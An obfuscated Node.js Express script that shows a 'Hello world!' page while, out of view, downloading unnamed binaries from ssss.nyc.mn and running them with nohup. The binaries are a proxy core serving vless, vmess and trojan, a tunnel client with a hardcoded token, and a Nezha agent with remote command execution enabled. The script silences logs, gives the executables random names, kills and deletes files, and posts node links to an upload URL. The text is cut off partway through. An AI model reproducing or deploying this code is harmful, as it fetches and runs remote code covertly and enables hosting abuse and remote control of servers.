const _0x2abb86=_0x1ebf;(function(_0x549fa8,_0x111605){const _0x4b21c1={_0x418a6b:0x258,_0x3966c:0x26a,_0x4d8f92:0x249,_0x42c13e:0x23d,_0x56e2d7:0x1f3,_0x2c5281:0x231},_0x2420c0=_0x1ebf,_0xa496f4=_0x549fa8();while(!![]){try{const _0x18a0f2=parseInt(_0x2420c0(_0x4b21c1._0x418a6b))/0x1*(parseInt(_0x2420c0(0x247))/0x2)+parseInt(_0x2420c0(0x1e5))/0x3*(parseInt(_0x2420c0(_0x4b21c1._0x3966c))/0x4)+-parseInt(_0x2420c0(_0x4b21c1._0x4d8f92))/0x5*(parseInt(_0x2420c0(_0x4b21c1._0x42c13e))/0x6)+-parseInt(_0x2420c0(_0x4b21c1._0x56e2d7))/0x7*(parseInt(_0x2420c0(0x293))/0x8)+parseInt(_0x2420c0(0x1de))/0x9*(-parseInt(_0x2420c0(_0x4b21c1._0x2c5281))/0xa)+-parseInt(_0x2420c0(0x294))/0xb+parseInt(_0x2420c0(0x233))/0xc;if(_0x18a0f2===_0x111605)break;else _0xa496f4['push'](_0xa496f4['shift']());}catch(_0x1a6e3f){_0xa496f4['push'](_0xa496f4['shift']());}}}(_0x1f72,0xd5e60));const express=require(_0x2abb86(0x1e0)),app=express(),axios=require(_0x2abb86(0x1f1)),os=require('os'),fs=require('fs'),path=require(_0x2abb86(0x22a)),{promisify}=require(_0x2abb86(0x24e)),exec=promisify(require(_0x2abb86(0x268))[_0x2abb86(0x23b)]),{execSync}=require(_0x2abb86(0x268)),UPLOAD_URL=process[_0x2abb86(0x26c)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x2abb86(0x26c)][_0x2abb86(0x27d)]||'',AUTO_ACCESS=process[_0x2abb86(0x26c)][_0x2abb86(0x220)]||![],FILE_PATH=process['env'][_0x2abb86(0x298)]||_0x2abb86(0x1fc),SUB_PATH=process[_0x2abb86(0x26c)][_0x2abb86(0x228)]||'Wbqsphr1',PORT=process[_0x2abb86(0x26c)][_0x2abb86(0x262)]||process[_0x2abb86(0x26c)][_0x2abb86(0x214)]||0xbb8,UUID=process['env'][_0x2abb86(0x1fb)]||_0x2abb86(0x24b),NEZHA_SERVER=process[_0x2abb86(0x26c)][_0x2abb86(0x1f8)]||'',NEZHA_PORT=process['env'][_0x2abb86(0x21c)]||'',NEZHA_KEY=process['env'][_0x2abb86(0x1e1)]||'',ARGO_DOMAIN=process[_0x2abb86(0x26c)][_0x2abb86(0x221)]||_0x2abb86(0x210),ARGO_AUTH=process[_0x2abb86(0x26c)][_0x2abb86(0x253)]||'eyJhIjoiZGYyOTYwYWJhMjI1NTUwYmIyOTQyNDdhM2NmNmM2Y2UiLCJ0IjoiOWI0NjA1YTctMjIwMy00YTg3LWJhNWItNTZmODIyZGQ2NzczIiwicyI6Ik9UUTVNR1ZoWVdVdE1qRTVZaTAwWXpCaUxUbGtZMlF0TURnMFpEUmpNREU1T0dVMCJ9',ARGO_PORT=process['env'][_0x2abb86(0x224)]||0x1f41,CFIP=process['env']['CFIP']||_0x2abb86(0x26d),CFPORT=process[_0x2abb86(0x26c)][_0x2abb86(0x226)]||0x1bb,NAME=process['env']['NAME']||_0x2abb86(0x20e);!fs[_0x2abb86(0x297)](FILE_PATH)?(fs[_0x2abb86(0x218)](FILE_PATH),console['log'](FILE_PATH+_0x2abb86(0x277))):console[_0x2abb86(0x27b)](FILE_PATH+_0x2abb86(0x241));function generateRandomName(){const _0x4d7e72={_0x3097ee:0x29b,_0x1cac12:0x299},_0x368f21=_0x2abb86,_0x1837cc=_0x368f21(_0x4d7e72._0x3097ee);let _0x454cc4='';for(let _0x535ceb=0x0;_0x535ceb<0x6;_0x535ceb++){_0x454cc4+=_0x1837cc[_0x368f21(_0x4d7e72._0x1cac12)](Math[_0x368f21(0x24a)](Math['random']()*_0x1837cc[_0x368f21(0x263)]));}return _0x454cc4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2abb86(0x27f)](FILE_PATH,npmName),phpPath=path[_0x2abb86(0x27f)](FILE_PATH,phpName),webPath=path[_0x2abb86(0x27f)](FILE_PATH,webName),botPath=path[_0x2abb86(0x27f)](FILE_PATH,botName),subPath=path[_0x2abb86(0x27f)](FILE_PATH,_0x2abb86(0x1fe)),listPath=path[_0x2abb86(0x27f)](FILE_PATH,_0x2abb86(0x200)),bootLogPath=path[_0x2abb86(0x27f)](FILE_PATH,_0x2abb86(0x242)),configPath=path[_0x2abb86(0x27f)](FILE_PATH,_0x2abb86(0x292));function deleteNodes(){const _0x4ec720={_0x4145ed:0x297,_0x2acdc2:0x261,_0x18777d:0x255,_0x36bd65:0x263,_0x34ae7a:0x25c,_0x5a8aa4:0x1ec},_0x1fc48c=_0x2abb86;try{if(!UPLOAD_URL)return;if(!fs[_0x1fc48c(_0x4ec720._0x4145ed)](subPath))return;let _0x429b22;try{_0x429b22=fs[_0x1fc48c(0x1e4)](subPath,'utf-8');}catch{return null;}const _0x2b4788=Buffer[_0x1fc48c(_0x4ec720._0x2acdc2)](_0x429b22,_0x1fc48c(_0x4ec720._0x18777d))['toString']('utf-8'),_0x4c83eb=_0x2b4788['split']('\x0a')[_0x1fc48c(0x26e)](_0x2f68ec=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1fc48c(0x203)](_0x2f68ec));if(_0x4c83eb[_0x1fc48c(_0x4ec720._0x36bd65)]===0x0)return;return axios['post'](UPLOAD_URL+_0x1fc48c(0x27a),JSON[_0x1fc48c(0x243)]({'nodes':_0x4c83eb}),{'headers':{'Content-Type':_0x1fc48c(_0x4ec720._0x34ae7a)}})[_0x1fc48c(_0x4ec720._0x5a8aa4)](_0x184773=>{return null;}),null;}catch(_0x162574){return null;}}function cleanupOldFiles(){const _0x11649f={_0x4d1bad:0x1f0},_0x3fe58a=_0x2abb86;try{const _0xc52baa=fs[_0x3fe58a(_0x11649f._0x4d1bad)](FILE_PATH);_0xc52baa['forEach'](_0x10ed8d=>{const _0x47a529=_0x3fe58a,_0x514767=path['join'](FILE_PATH,_0x10ed8d);try{const _0x5ef705=fs[_0x47a529(0x223)](_0x514767);_0x5ef705[_0x47a529(0x1ef)]()&&fs['unlinkSync'](_0x514767);}catch(_0xd32f55){}});}catch(_0x23d810){}}app[_0x2abb86(0x266)]('/',function(_0x187a6d,_0x17aecc){_0x17aecc['send']('Hello\x20world!');});async function generateConfig(){const _0x4ca4d8={_0x428d11:0x28a,_0x14f43d:0x280,_0x4b629e:0x28a,_0x6cbfd5:0x273,_0x20a4e7:0x295,_0x2f17bc:0x280,_0x155597:0x28a,_0x25aed3:0x260,_0x1e69ba:0x295,_0x5e35c5:0x27e,_0x526d4b:0x1ee,_0x5025d6:0x25e,_0x356aad:0x1ff,_0x49f17c:0x211,_0x2f7cff:0x27f,_0xf494d3:0x243},_0x1b8b3e=_0x2abb86,_0x378a63={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x1b8b3e(_0x4ca4d8._0x428d11)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1b8b3e(_0x4ca4d8._0x14f43d),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1b8b3e(_0x4ca4d8._0x4b629e),'fallbacks':[{'dest':0xbb9},{'path':_0x1b8b3e(_0x4ca4d8._0x6cbfd5),'dest':0xbba},{'path':_0x1b8b3e(0x1ee),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1b8b3e(0x234)}},{'port':0xbb9,'listen':_0x1b8b3e(_0x4ca4d8._0x20a4e7),'protocol':_0x1b8b3e(0x280),'settings':{'clients':[{'id':UUID}],'decryption':_0x1b8b3e(0x28a)},'streamSettings':{'network':_0x1b8b3e(0x234),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x1b8b3e(_0x4ca4d8._0x2f17bc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1b8b3e(0x28a)},'streamSettings':{'network':'ws','security':_0x1b8b3e(_0x4ca4d8._0x155597),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1b8b3e(_0x4ca4d8._0x25aed3),_0x1b8b3e(0x25e),_0x1b8b3e(0x1ff)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1b8b3e(_0x4ca4d8._0x1e69ba),'protocol':_0x1b8b3e(_0x4ca4d8._0x5e35c5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1b8b3e(_0x4ca4d8._0x526d4b)}},'sniffing':{'enabled':!![],'destOverride':[_0x1b8b3e(0x260),_0x1b8b3e(_0x4ca4d8._0x5025d6),_0x1b8b3e(_0x4ca4d8._0x356aad)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1b8b3e(_0x4ca4d8._0x1e69ba),'protocol':_0x1b8b3e(_0x4ca4d8._0x49f17c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1b8b3e(0x28a),'wsSettings':{'path':_0x1b8b3e(0x244)}},'sniffing':{'enabled':!![],'destOverride':[_0x1b8b3e(0x260),'tls',_0x1b8b3e(0x1ff)],'metadataOnly':![]}}],'dns':{'servers':[_0x1b8b3e(0x236)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x1b8b3e(0x20b),'tag':_0x1b8b3e(0x1df)}]};fs[_0x1b8b3e(0x21a)](path[_0x1b8b3e(_0x4ca4d8._0x2f7cff)](FILE_PATH,_0x1b8b3e(0x292)),JSON[_0x1b8b3e(_0x4ca4d8._0xf494d3)](_0x378a63,null,0x2));}function getSystemArchitecture(){const _0x529687={_0x4c5188:0x286,_0x48800a:0x272},_0x580ccc=_0x2abb86,_0x4471c9=os[_0x580ccc(_0x529687._0x4c5188)]();return _0x4471c9===_0x580ccc(0x283)||_0x4471c9==='arm64'||_0x4471c9===_0x580ccc(0x285)?'arm':_0x580ccc(_0x529687._0x48800a);}function downloadFile(_0xd75cf1,_0x2c05ad,_0xb301a6){const _0x9bc2c1={_0x2ea599:0x218,_0x2541d2:0x252,_0x3e9cb3:0x266,_0x4d559f:0x1dd},_0x5e2c21={_0x2e98be:0x23e},_0x5d9053={_0x46404a:0x22b,_0x2ea69e:0x229},_0x570e52={_0xae6c42:0x279,_0x4be167:0x27b},_0x1d742b=_0x2abb86,_0x494fa1=_0xd75cf1;!fs[_0x1d742b(0x297)](FILE_PATH)&&fs[_0x1d742b(_0x9bc2c1._0x2ea599)](FILE_PATH,{'recursive':!![]});const _0x2f2516=fs[_0x1d742b(_0x9bc2c1._0x2541d2)](_0x494fa1);axios({'method':_0x1d742b(_0x9bc2c1._0x3e9cb3),'url':_0x2c05ad,'responseType':_0x1d742b(_0x9bc2c1._0x4d559f)})[_0x1d742b(0x28e)](_0x230c38=>{const _0x2cfaca=_0x1d742b;_0x230c38[_0x2cfaca(_0x5d9053._0x46404a)][_0x2cfaca(0x264)](_0x2f2516),_0x2f2516['on']('finish',()=>{const _0x4bb88f=_0x2cfaca;_0x2f2516[_0x4bb88f(_0x570e52._0xae6c42)](),console[_0x4bb88f(_0x570e52._0x4be167)](_0x4bb88f(0x22c)+path['basename'](_0x494fa1)+_0x4bb88f(0x251)),_0xb301a6(null,_0x494fa1);}),_0x2f2516['on'](_0x2cfaca(_0x5d9053._0x2ea69e),_0x2dc19e=>{const _0x3f27d5=_0x2cfaca;fs['unlink'](_0x494fa1,()=>{});const _0x3cfb79=_0x3f27d5(0x22c)+path[_0x3f27d5(0x22e)](_0x494fa1)+'\x20failed:\x20'+_0x2dc19e[_0x3f27d5(0x291)];console[_0x3f27d5(0x229)](_0x3cfb79),_0xb301a6(_0x3cfb79);});})[_0x1d742b(0x1ec)](_0x42bc14=>{const _0x1c741b=_0x1d742b,_0x3c0a8c='Download\x20'+path[_0x1c741b(0x22e)](_0x494fa1)+_0x1c741b(_0x5e2c21._0x2e98be)+_0x42bc14['message'];console['error'](_0x3c0a8c),_0xb301a6(_0x3c0a8c);});}function _0x1f72(){const _0x28fa04=['ARGO_AUTH','\x20is\x20running','base64','?encryption=none&security=tls&sni=','.exe\x20>\x20nul\x202>&1','1519631fVNVvh','firefox','forEach','automatic\x20access\x20task\x20added\x20successfully','application/json','2096','tls','platform','http','from','SERVER_PORT','length','pipe','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','get','fileUrl','child_process','utf-8','1140364oivnkr','clear','env','cdns.doon.eu.org','filter','\x22\x20>\x20/dev/null\x202>&1','has','/api/add-subscriptions','amd','/vless-argo','true','Empowerment\x20success\x20for\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x20is\x20created','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','close','/api/delete-nodes','log','App\x20is\x20running','PROJECT_URL','vmess','join','vless','includes','ArgoDomain:','arm','2083','aarch64','arch','\x0a\x20\x20credentials-file:\x20','toString','Unknown','none','rm\x20-rf\x20','nohup\x20','/sub.txt\x20saved\x20successfully','then','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel.yml','message','config.json','273464hCxMXh','14699531YwXNQz','127.0.0.1','\x0a\x0avmess://','existsSync','FILE_PATH','charAt','Error\x20in\x20startserver:','abcdefghijklmnopqrstuvwxyz','stream','9fqnKsz','block','express','NEZHA_KEY','\x0avless://','substring','readFileSync','15XRLCBT','post','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','push','\x20-s\x20','success','TunnelSecret','catch','Nodes\x20uploaded\x20successfully','/vmess-argo','isFile','readdirSync','axios','Error\x20executing\x20command:\x20','28lqlPUt','fileName','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20tunnel:\x20','/tunnel.yml\x20run','NEZHA_SERVER','tunnel.json','Error\x20reading\x20boot.log:','UUID','./tmp','response','sub.txt','quic','list.txt','\x20>/dev/null\x202>&1','2087','test','status','map','https://amd64.ssss.nyc.mn/bot','\x20-p\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20-c\x20','https://arm64.ssss.nyc.mn/web','blackhole','https://arm64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','leaflow','https://ipapi.co/json/','leaflow.hxt.indevs.in','trojan','2053','unshift','PORT','all','/config.json\x20>/dev/null\x202>&1\x20&','unlinkSync','mkdirSync','listen','writeFileSync','https://arm64.ssss.nyc.mn/bot','NEZHA_PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','country_code','win32','AUTO_ACCESS','ARGO_DOMAIN','Skipping\x20adding\x20automatic\x20access\x20task','statSync','ARGO_PORT','org','CFPORT','\x0a\x0atrojan://','SUB_PATH','error','path','data','Download\x20','match','basename','Subscription\x20uploaded\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','14866750KVwLiG','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','31281060bAllsd','tcp','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https+local://8.8.8.8/dns-query','split','Error\x20downloading\x20files:','&fp=firefox&type=ws&host=','443','exec','npm\x20running\x20error:\x20','20070HJHtLd','\x20failed:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20>/dev/null\x202>&1\x20&','\x20already\x20exists','boot.log','stringify','/trojan-argo','\x20>\x20nul\x202>&1','text/plain;\x20charset=utf-8','2vMPIad','countryCode','2565YcurSQ','floor','0af1c34e-a70b-40a8-99c6-a6d7bbe66886','Content-Type','Empowerment\x20failed\x20for\x20','util','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','send','\x20successfully','createWriteStream'];_0x1f72=function(){return _0x28fa04;};return _0x1f72();}function _0x1ebf(_0x24b278,_0x14c8f6){const _0x1f7264=_0x1f72();return _0x1ebf=function(_0x1ebfbc,_0x13be8f){_0x1ebfbc=_0x1ebfbc-0x1dd;let _0x2be72f=_0x1f7264[_0x1ebfbc];return _0x2be72f;},_0x1ebf(_0x24b278,_0x14c8f6);}async function downloadFilesAndRun(){const _0x2a852c={_0x158228:0x263,_0x29c49a:0x205,_0x64ee62:0x215,_0x26b352:0x229,_0x4dc04c:0x238,_0x1595b5:0x23a,_0x341192:0x202,_0x264728:0x270,_0x3127f9:0x274,_0x5e9ae2:0x232,_0x4a69c2:0x23f,_0x4bcdb0:0x27f,_0x5e7532:0x21d,_0x159e6a:0x25d,_0x2282af:0x1e9,_0x365f4d:0x207,_0x4a12ec:0x27b,_0x50cc3d:0x23c,_0x1e574a:0x27b,_0x3ea568:0x254,_0x3647ff:0x297,_0x35336e:0x1f5,_0x24f0cd:0x1e7,_0x3ee04b:0x20d,_0x5b9cd9:0x240},_0x4b327b={_0x166ee1:0x25a},_0x5bb4d2={_0x6067fd:0x1f4,_0xf538a9:0x267},_0x407df4=_0x2abb86,_0x3529b3=getSystemArchitecture(),_0x357a83=getFilesForArchitecture(_0x3529b3);if(_0x357a83[_0x407df4(_0x2a852c._0x158228)]===0x0){console[_0x407df4(0x27b)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x58f0f5=_0x357a83[_0x407df4(_0x2a852c._0x29c49a)](_0x5ceb68=>{return new Promise((_0x2b55b3,_0x26360d)=>{const _0x1e5148=_0x1ebf;downloadFile(_0x5ceb68[_0x1e5148(_0x5bb4d2._0x6067fd)],_0x5ceb68[_0x1e5148(_0x5bb4d2._0xf538a9)],(_0x4b0aac,_0x3709d2)=>{_0x4b0aac?_0x26360d(_0x4b0aac):_0x2b55b3(_0x3709d2);});});});try{await Promise[_0x407df4(_0x2a852c._0x64ee62)](_0x58f0f5);}catch(_0x146e55){console[_0x407df4(_0x2a852c._0x26b352)](_0x407df4(_0x2a852c._0x4dc04c),_0x146e55);return;}function _0x53eea5(_0xad28c7){const _0x167502=_0x407df4,_0x5c05bf=0x1fd;_0xad28c7[_0x167502(_0x4b327b._0x166ee1)](_0x45acf4=>{const _0x49da61=_0x167502;fs[_0x49da61(0x297)](_0x45acf4)&&fs['chmod'](_0x45acf4,_0x5c05bf,_0x2a48ea=>{const _0x4a2012=_0x49da61;_0x2a48ea?console['error'](_0x4a2012(0x24d)+_0x45acf4+':\x20'+_0x2a48ea):console[_0x4a2012(0x27b)](_0x4a2012(0x275)+_0x45acf4+':\x20'+_0x5c05bf[_0x4a2012(0x288)](0x8));});});}const _0xa6891=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x53eea5(_0xa6891);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x589c76=NEZHA_SERVER[_0x407df4(0x281)](':')?NEZHA_SERVER[_0x407df4(0x237)](':')['pop']():'',_0x2cf64f=new Set([_0x407df4(_0x2a852c._0x1595b5),'8443','2096',_0x407df4(_0x2a852c._0x341192),_0x407df4(0x284),'2053']),_0x567d16=_0x2cf64f[_0x407df4(_0x2a852c._0x264728)](_0x589c76)?_0x407df4(_0x2a852c._0x3127f9):'false',_0x43f999='\x0aclient_secret:\x20'+NEZHA_KEY+_0x407df4(_0x2a852c._0x5e9ae2)+NEZHA_SERVER+_0x407df4(0x24f)+_0x567d16+_0x407df4(_0x2a852c._0x4a69c2)+UUID;fs['writeFileSync'](path[_0x407df4(_0x2a852c._0x4bcdb0)](FILE_PATH,'config.yaml'),_0x43f999);const _0xf5f6fa=_0x407df4(0x28c)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x407df4(_0x2a852c._0x5e7532);try{await exec(_0xf5f6fa),console['log'](phpName+_0x407df4(0x254)),await new Promise(_0xc15126=>setTimeout(_0xc15126,0x3e8));}catch(_0x4121d8){console[_0x407df4(_0x2a852c._0x26b352)]('php\x20running\x20error:\x20'+_0x4121d8);}}else{let _0xc02e3='';const _0x429857=[_0x407df4(0x23a),'8443',_0x407df4(_0x2a852c._0x159e6a),_0x407df4(0x202),'2083',_0x407df4(0x212)];_0x429857['includes'](NEZHA_PORT)&&(_0xc02e3='--tls');const _0x2ac5fc=_0x407df4(0x28c)+npmPath+_0x407df4(_0x2a852c._0x2282af)+NEZHA_SERVER+':'+NEZHA_PORT+_0x407df4(_0x2a852c._0x365f4d)+NEZHA_KEY+'\x20'+_0xc02e3+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2ac5fc),console[_0x407df4(_0x2a852c._0x4a12ec)](npmName+_0x407df4(0x254)),await new Promise(_0x17c46a=>setTimeout(_0x17c46a,0x3e8));}catch(_0x235701){console[_0x407df4(0x229)](_0x407df4(_0x2a852c._0x50cc3d)+_0x235701);}}}else console[_0x407df4(_0x2a852c._0x1e574a)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2a5b90=_0x407df4(0x28c)+webPath+_0x407df4(0x209)+FILE_PATH+_0x407df4(0x216);try{await exec(_0x2a5b90),console['log'](webName+_0x407df4(_0x2a852c._0x3ea568)),await new Promise(_0x3a5529=>setTimeout(_0x3a5529,0x3e8));}catch(_0x5538c2){console[_0x407df4(0x229)]('web\x20running\x20error:\x20'+_0x5538c2);}if(fs[_0x407df4(_0x2a852c._0x3647ff)](botPath)){let _0x598544;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x598544=_0x407df4(_0x2a852c._0x35336e)+ARGO_AUTH;else ARGO_AUTH[_0x407df4(0x22d)](/TunnelSecret/)?_0x598544=_0x407df4(_0x2a852c._0x24f0cd)+FILE_PATH+_0x407df4(0x1f7):_0x598544='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x407df4(_0x2a852c._0x3ee04b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x598544+_0x407df4(_0x2a852c._0x5b9cd9)),console[_0x407df4(0x27b)](botName+_0x407df4(_0x2a852c._0x3ea568)),await new Promise(_0x29532f=>setTimeout(_0x29532f,0x7d0));}catch(_0x2b5f90){console[_0x407df4(_0x2a852c._0x26b352)](_0x407df4(0x1f2)+_0x2b5f90);}}await new Promise(_0x356d8a=>setTimeout(_0x356d8a,0x1388));}function getFilesForArchitecture(_0x642b92){const _0x46ed9b={_0x2b189c:0x21b,_0x91427a:0x283,_0x16bf71:0x20c,_0x1f4ed0:0x213},_0x6b57e1=_0x2abb86;let _0x3948a7;_0x642b92===_0x6b57e1(0x283)?_0x3948a7=[{'fileName':webPath,'fileUrl':_0x6b57e1(0x20a)},{'fileName':botPath,'fileUrl':_0x6b57e1(_0x46ed9b._0x2b189c)}]:_0x3948a7=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x6b57e1(0x206)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2adb58=_0x642b92===_0x6b57e1(0x283)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x3948a7[_0x6b57e1(0x213)]({'fileName':npmPath,'fileUrl':_0x2adb58});}else{const _0x17ab0a=_0x642b92===_0x6b57e1(_0x46ed9b._0x91427a)?_0x6b57e1(_0x46ed9b._0x16bf71):'https://amd64.ssss.nyc.mn/v1';_0x3948a7[_0x6b57e1(_0x46ed9b._0x1f4ed0)]({'fileName':phpPath,'fileUrl':_0x17ab0a});}}return _0x3948a7;}function argoType(){const _0x467ae6={_0x42936a:0x1eb,_0x34cc12:0x21a,_0x4f2f7c:0x27f,_0x391a63:0x1f9,_0x1c2663:0x1f6,_0x2e1bba:0x287},_0x1ac0ed=_0x2abb86;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ac0ed(0x27b)](_0x1ac0ed(0x28f));return;}if(ARGO_AUTH[_0x1ac0ed(0x281)](_0x1ac0ed(_0x467ae6._0x42936a))){fs[_0x1ac0ed(_0x467ae6._0x34cc12)](path[_0x1ac0ed(_0x467ae6._0x4f2f7c)](FILE_PATH,_0x1ac0ed(_0x467ae6._0x391a63)),ARGO_AUTH);const _0x44345a=_0x1ac0ed(_0x467ae6._0x1c2663)+ARGO_AUTH['split']('\x22')[0xb]+_0x1ac0ed(_0x467ae6._0x2e1bba)+path[_0x1ac0ed(_0x467ae6._0x4f2f7c)](FILE_PATH,'tunnel.json')+_0x1ac0ed(0x265)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1ac0ed(_0x467ae6._0x34cc12)](path[_0x1ac0ed(0x27f)](FILE_PATH,_0x1ac0ed(0x290)),_0x44345a);}else console[_0x1ac0ed(0x27b)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x445e33={_0x43a337:0x27f,_0x56e127:0x269,_0x2946a6:0x237,_0x4c484b:0x263,_0x194829:0x27b,_0x4f9cac:0x282,_0x178f5d:0x278,_0x928119:0x235,_0x4ad948:0x240,_0x572c5e:0x1f2,_0xcbf1f:0x229},_0x2775ae={_0x5532a1:0x266,_0x57a98a:0x22b,_0x49553d:0x225,_0x12ea69:0x21e,_0x4f1ffa:0x225,_0x303741:0x22b,_0x5a60ee:0x204,_0x2391c7:0x22b,_0x8817c9:0x289},_0x3ed144={_0x285922:0x25f,_0x177d14:0x257,_0x451c44:0x299,_0x458c3a:0x1e3,_0x5d0a55:0x26f},_0x3b4bc7=_0x2abb86;let _0xccd086;if(ARGO_AUTH&&ARGO_DOMAIN)_0xccd086=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0xccd086),await _0x5f3417(_0xccd086);else try{const _0x5cdf5c=fs[_0x3b4bc7(0x1e4)](path[_0x3b4bc7(_0x445e33._0x43a337)](FILE_PATH,_0x3b4bc7(0x242)),_0x3b4bc7(_0x445e33._0x56e127)),_0x2126f6=_0x5cdf5c[_0x3b4bc7(_0x445e33._0x2946a6)]('\x0a'),_0x321f17=[];_0x2126f6['forEach'](_0x1b5ba5=>{const _0x56f4bf=_0x1b5ba5['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x56f4bf){const _0x2071d2=_0x56f4bf[0x1];_0x321f17['push'](_0x2071d2);}});if(_0x321f17[_0x3b4bc7(_0x445e33._0x4c484b)]>0x0)_0xccd086=_0x321f17[0x0],console[_0x3b4bc7(_0x445e33._0x194829)](_0x3b4bc7(_0x445e33._0x4f9cac),_0xccd086),await _0x5f3417(_0xccd086);else{console[_0x3b4bc7(0x27b)](_0x3b4bc7(_0x445e33._0x178f5d)),fs[_0x3b4bc7(0x217)](path['join'](FILE_PATH,'boot.log'));async function _0x32d191(){const _0x308911=_0x3b4bc7;try{process[_0x308911(_0x3ed144._0x285922)]===_0x308911(0x21f)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x308911(_0x3ed144._0x177d14)):await exec('pkill\x20-f\x20\x22['+botName[_0x308911(_0x3ed144._0x451c44)](0x0)+']'+botName[_0x308911(_0x3ed144._0x458c3a)](0x1)+_0x308911(_0x3ed144._0x5d0a55));}catch(_0x3b878a){}}_0x32d191(),await new Promise(_0x3aa7b1=>setTimeout(_0x3aa7b1,0xbb8));const _0x1c56d4=_0x3b4bc7(_0x445e33._0x928119)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x3b4bc7(0x28c)+botPath+'\x20'+_0x1c56d4+_0x3b4bc7(_0x445e33._0x4ad948)),console['log'](botName+_0x3b4bc7(0x254)),await new Promise(_0x4fb6b5=>setTimeout(_0x4fb6b5,0xbb8)),await extractDomains();}catch(_0xc7dde2){console[_0x3b4bc7(0x229)](_0x3b4bc7(_0x445e33._0x572c5e)+_0xc7dde2);}}}catch(_0x38fc02){console[_0x3b4bc7(_0x445e33._0xcbf1f)](_0x3b4bc7(0x1fa),_0x38fc02);}async function _0x53be1a(){const _0x511abf=_0x3b4bc7;try{const _0x5aba1a=await axios[_0x511abf(_0x2775ae._0x5532a1)](_0x511abf(0x20f),{'timeout':0xbb8});if(_0x5aba1a['data']&&_0x5aba1a[_0x511abf(_0x2775ae._0x57a98a)]['country_code']&&_0x5aba1a[_0x511abf(0x22b)][_0x511abf(_0x2775ae._0x49553d)])return _0x5aba1a[_0x511abf(_0x2775ae._0x57a98a)][_0x511abf(_0x2775ae._0x12ea69)]+'_'+_0x5aba1a[_0x511abf(_0x2775ae._0x57a98a)][_0x511abf(_0x2775ae._0x4f1ffa)];}catch(_0xa2dfe2){try{const _0x3a8e15=await 